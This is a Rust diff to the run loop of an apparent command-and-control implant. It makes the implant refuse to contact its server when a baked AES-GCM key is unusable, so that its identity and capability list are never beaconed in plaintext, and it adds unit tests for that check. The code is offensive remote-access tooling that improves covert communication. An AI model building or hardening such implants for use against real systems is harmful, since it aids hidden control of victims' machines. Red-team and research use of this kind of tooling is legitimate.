@@ -56,12 +56,23 @@ pub fn run(profile: &Profile) -> Exit {
     );
 
     let cadence: Cadence = Arc::new(Mutex::new((profile.sleep_seconds, profile.jitter_seconds)));
+    // A profile that names the sealed carriage but bakes a key the parser
+    // refuses must fail closed, the same refusal enrollment makes: contacts
+    // would otherwise fall back to plaintext and broadcast the implant's
+    // identity and capability list in the clear on every cycle.
+    let seal = match resolve_seal(profile) {
+        Ok(seal) => seal,
+        Err(cause) => {
+            crate::diag!("{cause}; refusing to contact in the clear");
+            return Exit::Terminated(1);
+        }
+    };
     let mut session = Session::new(
         enrollment.implant_id,
         &profile.verbs,
         cadence,
         enrollment.ca_chain,
-        Seal::parse(&profile.envelope_key).filter(|_| profile.contact_envelope == "aesgcm"),
+        seal,
         profile.kill_date.clone(),
         profile.mode != "stream",
     );
@@ -93,5 +104,74 @@ pub fn run(profile: &Profile) -> Exit {
             }
         }
         session.backoff_sleep(failures);
+    }
+}
+
+/// Resolves the contact seal a profile carries: none for a plaintext
+/// carriage, the parsed pair for a sealed one, and an error for a profile
+/// that names the sealed carriage but bakes a key the parser refuses --
+/// the run fails closed instead of degrading contacts to plaintext.
+fn resolve_seal(profile: &Profile) -> Result<Option<Seal>, &'static str> {
+    if profile.contact_envelope != "aesgcm" {
+        return Ok(None);
+    }
+    Seal::parse(&profile.envelope_key)
+        .map(Some)
+        .ok_or("aesgcm contact envelope baked with no usable key")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn profile(contact_envelope: &str, envelope_key: &str) -> Profile {
+        Profile {
+            enroll_url: "https://front.example".into(),
+            fallback_enroll_urls: Vec::new(),
+            ca_pem: String::new(),
+            tls_trust: "pinned".into(),
+            kill_date: None,
+            sleep_seconds: 30.0,
+            jitter_seconds: 10.0,
+            mode: "poll".into(),
+            enroll_path: "/implants/enroll".into(),
+            request_timeout_seconds: 30.0,
+            envelope: "none".into(),
+            contact_envelope: contact_envelope.into(),
+            envelope_key: envelope_key.into(),
+            token: String::new(),
+            verbs: Vec::new(),
+        }
+    }
+
+    #[test]
+    fn a_plaintext_carriage_carries_no_seal() {
+        let plain = profile("none", "");
+        assert!(resolve_seal(&plain).expect("plaintext resolves").is_none());
+    }
+
+    #[test]
+    fn a_sealed_carriage_parses_its_key() {
+        // base64 of 16 key-id bytes plus 32 key bytes, the bake's packed
+        // shape.
+        let packed: Vec<u8> = (0u8..48).collect();
+        use base64::Engine;
+        let key = base64::engine::general_purpose::STANDARD.encode(packed);
+        let seal = resolve_seal(&profile("aesgcm", &key))
+            .expect("a well-formed bake resolves")
+            .expect("and carries a seal");
+        assert_eq!(seal.key_id.to_vec(), (0u8..16).collect::<Vec<u8>>());
+        assert_eq!(seal.key.to_vec(), (16u8..48).collect::<Vec<u8>>());
+    }
+
+    #[test]
+    fn a_sealed_carriage_with_an_unusable_key_fails_closed() {
+        // The bake names aesgcm but the key is not the packed shape: the
+        // refusal is loud, never a silent fallback to plaintext contacts.
+        let err = match resolve_seal(&profile("aesgcm", "not-base64-key")) {
+            Err(cause) => cause,
+            Ok(_) => panic!("a malformed baked key must be refused"),
+        };
+        assert_eq!(err, "aesgcm contact envelope baked with no usable key");
     }
 }
